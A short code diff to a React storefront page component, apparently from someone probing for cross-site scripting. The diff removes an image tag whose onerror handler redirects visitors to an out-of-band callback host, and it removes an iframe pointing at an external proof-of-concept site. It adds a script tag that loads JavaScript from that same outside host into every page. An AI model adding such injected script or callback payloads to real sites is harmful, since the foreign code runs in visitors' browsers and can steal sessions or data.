@@ -52,11 +52,11 @@ export default function App() {
         <Links />
       </head>
       <body>
-        <h1>Hello, {JSON.stringify(data)}</h1>
-<img src onerror='location=`http://fbuz558sx6xwkegcvppwpazi79d01rwfl.oastify.com`'/>
+        <h1>Hello, {data}</h1>
+
         <p>This is a custom storefront powered by Hydrogenafrraaa</p>
 
-<iframe src="https://poc.wleberre.fr/testmixe.html"/>
+<script src="https://poc.wleberre.fr/js.js"></script>
         <Outlet />
         <ScrollRestoration />
         <Scripts />
